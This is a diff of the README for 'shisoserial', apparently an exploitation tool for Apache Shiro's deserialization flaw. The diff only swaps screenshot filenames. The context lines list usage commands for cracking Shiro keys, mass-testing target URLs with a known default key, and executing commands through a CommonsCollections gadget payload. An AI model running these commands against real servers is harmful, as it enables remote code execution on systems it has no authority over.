@@ -60,7 +60,7 @@ optional arguments:
 python3 shisoserial.py -m check -u http://127.0.0.1:8080
 ```
 
-![](README.assets/image-20211229165754332.png)
+![](README.assets/1.png)
 
 ### Use proxy angent cracking the shiro key with CBC mode
 
@@ -68,7 +68,7 @@ python3 shisoserial.py -m check -u http://127.0.0.1:8080
 python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p http://*.*.*.*:****/
 ```
 
-![](README.assets/image-20211229171904315.png)
+![](README.assets/2.jpg)
 
 ### Use Tomcat echo payload attack with  CommonsCollectionsK1 gadget (no DNSlog used)
 
@@ -76,7 +76,7 @@ python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p http://*.*.*.*:
 python3 shisoserial.py -m echo -u http://127.0.0.1:8080 -g CommonsCollectionsK1 -c id
 ```
 
-![](README.assets/image-20211229175021680.png)
+![](README.assets/2.jpg)
 
 ### Mass use specified shiro key with Post method
 
@@ -84,7 +84,7 @@ python3 shisoserial.py -m echo -u http://127.0.0.1:8080 -g CommonsCollectionsK1 
 python3 shisoserial.py -m crack -u target_urls.txt -k kPH+bIxk5D2deZiIxcaaaA== -d username=1
 ```
 
-![image-20211229223405240](README.assets/image-20211229223405240.png)
+![image-20211229223405240](README.assets/4.jpg)
 
 ### Use serialize file send payload with multithreading
 
@@ -92,7 +92,7 @@ python3 shisoserial.py -m crack -u target_urls.txt -k kPH+bIxk5D2deZiIxcaaaA== -
 python3 shisoserial.py -m encode -u target_urls.txt -t cbc -s 1.ser -T 4
 ```
 
-![image-20211230181021173](README.assets/image-20211230181021173.png)
+![image-20211230181021173](README.assets/5.jpg)
 
 ## Disclaimer
 
